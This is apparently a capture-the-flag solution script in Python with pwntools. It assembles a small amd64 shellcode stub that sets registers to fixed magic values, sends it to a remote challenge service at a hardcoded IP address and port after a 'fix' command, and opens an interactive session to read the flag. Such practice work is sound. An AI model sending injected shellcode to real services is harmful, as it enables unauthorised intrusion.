#!/usr/bin/env python3
from pwn import *

# set architecture so asm() knows which ISA to target
context.arch = 'amd64'
# optional, makes pwntools print every send/recv
# context.log_level = 'debug'

# your assembled stub, exactly as you wrote it
shellcode = asm(
    '''
    mov r8,  0x1337c0de
    mov r9,  0xdeadbeef
    mov r10, 0xdead1337
    mov r12, 0x1337cafe
    mov r13, 0xbeefc0de
    mov r14, 0x13371337
    mov r15, 0x1337dead
    ret
    '''
)

# connect to remote service
p = remote('94.237.51.163', 35708)

# send the “fix” command to pass the first check
p.sendline(b'fix')

# send the raw shellcode payload
p.send(shellcode)

# drop to interactive so you can see the flag
p.interactive()
